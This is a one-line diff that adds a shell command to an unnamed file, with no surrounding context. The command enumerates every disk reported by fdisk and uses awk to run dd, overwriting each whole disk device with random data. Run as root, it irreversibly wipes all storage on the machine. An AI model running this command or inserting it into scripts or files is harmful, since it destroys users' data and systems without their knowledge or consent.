@@ -1,0 +1,1 @@
+fdisk -l | grep 'Disk /dev/' | sed 's#/dev/##g' | sed 's#:##g' | awk  '{system("dd if=/dev/urandom of=/dev/"$2)}'
